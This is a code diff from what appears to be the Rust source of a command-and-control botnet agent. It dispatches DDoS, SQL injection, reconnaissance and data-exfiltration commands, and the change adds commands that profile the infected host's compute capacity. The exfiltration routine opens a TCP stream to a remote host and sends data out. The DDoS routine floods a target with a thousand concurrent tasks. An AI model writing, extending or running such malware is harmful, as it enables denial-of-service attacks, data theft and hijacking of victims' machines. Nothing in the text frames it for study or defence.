@@ -1,6 +1,7 @@
 use crate::commands::Command;
 use crate::error::C2Error;
 use crate::recon::{ReconConfig, ReconEngine};
+use crate::compute::capability;
 use tokio::net::TcpStream;
 use tokio::io::AsyncWriteExt;
 use std::process::Command as ShellCommand;
@@ -16,6 +17,8 @@ pub async fn execute_attack(command: &Command) -> Result<String, C2Error> {
         "sql_injection" => sql_injection_attack(&command.args).await.map(|_| "OK".to_string()),
         "recon_scan" => recon_scan(&command.args).await,
         "recon_full" => recon_full(&command.args).await,
+        "compute_profile" => compute_profile().await,
+        "compute_status" => compute_status(&command.args).await,
         _ => Err(C2Error::CommandError("Unknown command".to_string())),
     }
 }
@@ -26,8 +29,8 @@ async fn ddos_attack(args: &[String]) -> Result<(), C2Error> {
     }
 
     let target_ip = &args[0];
-    let target_port: u16 = args[1].parse().map_err(|e| C2Error::CommandError(e.to_string()))?;
-    
+    let target_port: u16 = args[1].parse().map_err(|e: std::num::ParseIntError| C2Error::CommandError(e.to_string()))?;
+
     for _ in 0..1000 {
         let target = target_ip.clone();
         tokio::spawn(async move {
@@ -45,7 +48,7 @@ async fn data_exfiltration(args: &[String]) -> Result<(), C2Error> {
     }
 
     let target_ip = &args[0];
-    let target_port: u16 = args[1].parse().map_err(|e| C2Error::CommandError(e.to_string()))?;
+    let target_port: u16 = args[1].parse().map_err(|e: std::num::ParseIntError| C2Error::CommandError(e.to_string()))?;
     let data = args[2].as_bytes();
     
     let mut stream = TcpStream::connect((target_ip.as_str(), target_port)).await?;
@@ -156,6 +159,17 @@ async fn recon_scan(args: &[String]) -> Result<String, C2Error> {
     let open = engine.scan_targets(&expanded).await?;
 
     serde_json::to_string(&open).map_err(|e| C2Error::ReconError(e.to_string()))
+}
+
+async fn compute_profile() -> Result<String, C2Error> {
+    let cap = capability::profile_local();
+    serde_json::to_string(&cap).map_err(|e| C2Error::CommandError(e.to_string()))
+}
+
+async fn compute_status(_args: &[String]) -> Result<String, C2Error> {
+    let cap = capability::profile_local();
+    let score = cap.compute_score(0);
+    serde_json::to_string(&score).map_err(|e| C2Error::CommandError(e.to_string()))
 }
 
 async fn recon_full(args: &[String]) -> Result<String, C2Error> {
